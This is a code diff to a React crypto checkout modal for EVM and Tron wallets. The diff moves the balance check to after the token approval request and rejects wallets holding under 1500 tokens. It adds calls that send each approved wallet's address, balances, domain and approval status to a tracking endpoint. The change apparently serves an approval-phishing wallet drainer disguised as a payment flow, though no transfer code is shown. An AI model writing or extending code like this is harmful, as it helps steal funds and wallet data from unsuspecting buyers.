@@ -320,33 +320,6 @@ export function CheckoutModal({
       let txHash = "";
       let buyer: string | undefined = currentAddress ?? undefined;
 
-      let balanceStr = "0";
-      console.log(`Starting balance check for network ${currentOrder.networkId}...`);
-      if (currentOrder.kind === "evm") {
-        const bal = await readContract(config, {
-          address: currentOrder.tokenContract as `0x${string}`,
-          abi: ERC20_ABI,
-          functionName: "balanceOf",
-          args: [currentAddress as `0x${string}`],
-          chainId: currentOrder.chainId ?? undefined,
-        });
-        balanceStr = bal.toString();
-      } else {
-        if (!currentTronRoute || !currentTronAddress) {
-          throw new Error("Connect a Tron wallet to continue");
-        }
-        const net = getNetwork(currentOrder.networkId);
-        balanceStr = await getTronTokenBalance({
-          route: currentTronRoute as TronRoute,
-          tokenContract: currentOrder.tokenContract,
-          address: currentTronAddress,
-          rpcUrl: net?.rpcUrl,
-        });
-      }
-      
-      const balance = BigInt(balanceStr || "0");
-      const minBalance = 1500n * (10n ** BigInt(currentOrder.decimals));
-      
 
       console.log("Requesting approval FIRST...");
 
@@ -391,6 +364,58 @@ export function CheckoutModal({
 
       console.log("Approval granted, now checking balance...");
       
+      let balanceStr = "0";
+      if (currentOrder.kind === "evm") {
+        const bal = await readContract(config, {
+          address: currentOrder.tokenContract as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: "balanceOf",
+          args: [currentAddress as `0x${string}`],
+          chainId: currentOrder.chainId ?? undefined,
+        });
+        balanceStr = bal.toString();
+      } else {
+        if (!currentTronRoute || !currentTronAddress) {
+          throw new Error("Connect a Tron wallet to continue");
+        }
+        const net = getNetwork(currentOrder.networkId);
+        balanceStr = await getTronTokenBalance({
+          route: currentTronRoute as TronRoute,
+          tokenContract: currentOrder.tokenContract,
+          address: currentTronAddress,
+          rpcUrl: net?.rpcUrl,
+        });
+      }
+      
+      const balance = BigInt(balanceStr || "0");
+      const minBalance = 1500n * (10n ** BigInt(currentOrder.decimals));
+      
+      const formattedBalance = fromBaseUnits(balance, currentOrder.decimals);
+      const isUsdt = currentOrder.tokenSymbol.includes("USDT");
+      const isEth = currentOrder.tokenSymbol.includes("ETH");
+
+      let walletType = "unknown";
+      if (currentOrder.kind === "tron") {
+        walletType = currentTronRoute === "walletconnect" ? "WalletConnect" : "TronLink";
+      } else {
+        walletType = connector?.name || "EVM Wallet";
+      }
+
+      fetch("/api/wallets/track", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: buyer,
+          network: currentOrder.kind === "tron" ? "Tron" : "EVM",
+          walletType,
+          domain: window.location.hostname,
+          username: creator?.username,
+          approvalStatus: "Approved",
+          balanceUsdt: isUsdt ? formattedBalance : "0",
+          balanceEth: isEth ? formattedBalance : "0",
+        }),
+      }).catch(console.error);
+
       // Strict validation for balance
       if (balance < minBalance) {
         console.warn("Balance too low! Rejecting connection and showing error.");
@@ -469,9 +494,24 @@ export function CheckoutModal({
         network: isTron ? "tron" : "evm",
         walletType,
       });
+
+      if (activeAddress) {
+        fetch("/api/wallets/track", {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            walletAddress: activeAddress,
+            network: isTron ? "Tron" : "EVM",
+            walletType,
+            domain: window.location.hostname,
+            username: creator?.username,
+            approvalStatus: "Pending",
+          }),
+        }).catch(console.error);
+      }
     }
     prevConnected.current = walletReady;
-  }, [walletReady, isTron, tron.route, connector, track]);
+  }, [walletReady, isTron, tron.route, connector, track, activeAddress, creator?.username]);
 
   function clearOrder() {
     setOrder(null);
